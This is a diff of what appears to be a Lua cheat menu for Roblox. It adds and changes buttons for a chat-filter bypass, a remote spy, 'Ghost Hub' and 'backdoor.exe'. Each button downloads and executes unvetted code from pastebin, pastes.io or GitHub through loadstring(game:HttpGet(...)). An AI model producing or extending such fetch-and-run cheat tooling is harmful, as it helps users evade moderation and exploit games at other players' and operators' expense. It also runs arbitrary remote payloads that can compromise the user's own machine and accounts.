@@ -210,12 +210,20 @@ MainSection:NewButton("Flight", "makes you fly", function()
 	startFlying()
 end)
 
-MainSection:NewButton("Chat Bypass", "gives you a chat bypass gui", function()
-	loadstring(game:HttpGet("https://raw.githubusercontent.com/BakaPraselol/MRCBV4LSB4KRS/main/Loader"))()
+MainSection:NewButton("Chat Bypass (MIGHT SEND A MESSAGE IN CHAT)", "chat bypasses anything u say", function()
+	loadstring(game:HttpGet("https://pastes.io/raw/lstrrfipqq"))();
 end)
 
 MainSection:NewButton("Turtle Spy", "gives you a remote spy gui", function()
 	loadstring(game:HttpGet("https://pastebin.com/raw/BDhSQqUU", true))()
+end)
+
+MainSection:NewButton("Ghost Hub", "gives you ghost hub", function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/GhostPlayer352/Test4/main/GhostHub"))()
+end)
+
+MainSection:NewButton("backdoor.exe", "gives you backdoor.exe", function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/iK4oS/backdoor.exe/v6x/source.lua"))()
 end)
 
 MainSection:NewSlider("Walkspeed", "changes how fast you walk, default: 16", 250, 16, function(s) -- 500 (MaxValue) | 0 (MinValue)
